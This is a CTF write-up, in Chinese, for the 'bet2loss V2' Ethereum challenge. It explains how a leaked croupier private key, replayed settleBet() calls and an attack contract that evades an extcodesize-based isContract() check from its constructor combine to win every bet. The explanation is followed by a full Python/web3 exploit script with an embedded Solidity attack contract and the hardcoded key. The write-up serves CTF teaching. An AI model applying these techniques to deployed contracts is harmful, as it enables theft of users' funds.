# bet2loss V2
> 出题人：Lurkrul、kevin 考察点：replay attack

本题改编自 HCTF 2018 bet2loss; bet2loss 的 web 源码已于 github 公开 [[1][3]].

在 settings.py 中有泄漏 *croupier* 的私钥, onlyCroupier 的函数可以直接拿此账号调用.

注意到 bet 绑定 *player*, `settleBet()` 可以施行 replay attack, 收益与重放次数以及 *diceWin* 有关. 由于限制了开注次数, 因此需要最大化 *diceWin* (运气好, all in 成功了我也没话说). 每次 bet 最多获得 100k, flag 需要 300k, 开注一次,重放两次即可. 

计算 dice 的方法伪随机, 拿到账号后可以自己实现签名, 需要预测的是 *block.number*. 这可以部署合约来提前获取. `settleBet()`里有个 `isContract()`, 它是通过 extcodesize 来判断, 但是从 constructor 中调用时返回 0 [[2][4]]. 综上, 可以部署合约来实现稳赢.

实际比赛中, 几乎没有队伍去考虑绕过 `isContract()`, 还有队伍没发现泄漏的私钥直接爆破 *reveal* 和 web 层交互的. ~~一波骚操作简直亮瞎狗眼.~~

注意到有些队伍生成签名的时候卡住了, 这里稍微提一下. 合约中看起来并没有改过, 但是 *commitLastBlock* 的类型变了, 然而 `abi.encodePacked()` 返回内容会随类型改变 [[3][5]], 所以 HCTF 那题的代码并不能直接拿来用. 

[3]:https://github.com/LoRexxar/HCTF2018_bet2loss
[4]:https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract/15642#15642
[5]:https://solidity.readthedocs.io/en/v0.5.13/abi-spec.html#non-standard-packed-mode
```python
from web3 import Web3
from solc import compile_source
import os, random

infura_url = 'https://ropsten.infura.io/v3/xxx'
web3 = Web3(Web3.HTTPProvider(infura_url))
accounts = {
    'player': {
        'addr': '0x8F1D24E114aA84bC66d8950142008348b4c6cEd0',
        'priv': ''
    }, 
    'croupier': {
        'addr': '0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C',
        'priv': '6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12'
    }
}


def sign(reveal):
    result = {'reveal':reveal}
    
    commitLastBlock = web3.eth.blockNumber + 250
    result['commitLastBlock'] = commitLastBlock
    
    commit = web3.sha3( reveal.to_bytes(32, 'big') )
    result['commit'] = int.from_bytes(commit, 'big')
    
    message = commitLastBlock.to_bytes(5, 'big') + commit
    message_hash = web3.sha3(message)
    signature = web3.eth.account.signHash(message_hash, private_key=accounts['croupier']['priv'])
    result['r'] = signature['r']
    result['s'] = signature['s']
    result['v'] = signature['v']
    
    return result


def transact(_to, _data):
    tx = {
        'from': defaultAccount['addr'],
        'nonce': web3.eth.getTransactionCount(defaultAccount['addr']),
        'to': _to,
        'gas': 1000000,
        'value': 0,
        'gasPrice': web3.eth.gasPrice * 2,
        'data': _data,
    }
    signed_tx = web3.eth.account.signTransaction(tx, defaultAccount['priv'])
    tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
    tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
    return tx_receipt


def settleBet():
    transact( gameAddress, web3.sha3(b'settleBet(uint256)')[:4].hex() + hex(reveal)[2:].rjust(64, '0') )


def getFlag():
    transact( attackAddress, web3.sha3(b'getFlag()')[:4].hex() )


attack = '''pragma solidity ^0.4.24;
contract Attack {
    address constant croupier = 0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C;
    uint8 constant modulo = 100;
    uint40 constant wager = 1000;
    uint8 betnumber;
    address game;

    constructor(address _game, uint40 commitLastBlock, uint commit, bytes32 r, bytes32 s, uint8 v, uint reveal) public {
        game = _game;
        bytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock, commit));
        require (croupier == ecrecover(signatureHash, v, r, s), "signature is not valid.");
        require (commit == uint(keccak256(abi.encodePacked(reveal))), "commit is not valid.");

        bytes32 entropy = keccak256(abi.encodePacked(reveal, uint(block.number)));
        uint _betnumber = uint(entropy) % uint(modulo);
        betnumber = uint8(_betnumber);

        game.call(bytes4(keccak256("placeBet(uint8,uint8,uint40,uint40,uint256,bytes32,bytes32,uint8)")),betnumber,modulo,wager,commitLastBlock,commit,r,s,v);

    }

    function getFlag() external {
        game.call(bytes4(keccak256("PayForFlag()")));
        selfdestruct(0);
    }

}'''


defaultAccount = accounts['player']
gameAddress = ''

reveal = random.randint(1, 2**40)
result = sign(reveal)

compiled_sol = compile_source(attack)
contract_interface = compiled_sol['<stdin>:Attack']
bytecode = contract_interface['bin']
bytecode += gameAddress[2:].rjust(64, '0')
bytecode += hex( result['commitLastBlock'] )[2:].rjust(64, '0')
bytecode += hex( result['commit'] )[2:].rjust(64, '0')
bytecode += hex( result['r'] )[2:].rjust(64, '0')
bytecode += hex( result['s'] )[2:].rjust(64, '0')
bytecode += hex( result['v'] )[2:].rjust(64, '0')
bytecode += hex( result['reveal'] )[2:].rjust(64, '0')
tx = {
    'from': defaultAccount['addr'],
    'nonce': web3.eth.getTransactionCount(defaultAccount['addr']),
    'gas': 1000000,
    'value': 0,
    'gasPrice': web3.eth.gasPrice * 2,
    'data': '0x' + bytecode,
}
signed_tx = web3.eth.account.signTransaction(tx, defaultAccount['priv'])
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
attackAddress =  tx_receipt.contractAddress
print('attack Address: ' + attackAddress)


defaultAccount = accounts['croupier']
for _ in range(3):
    settleBet()
    print('settleBet')


defaultAccount = accounts['player']
getFlag()
print('done')
```
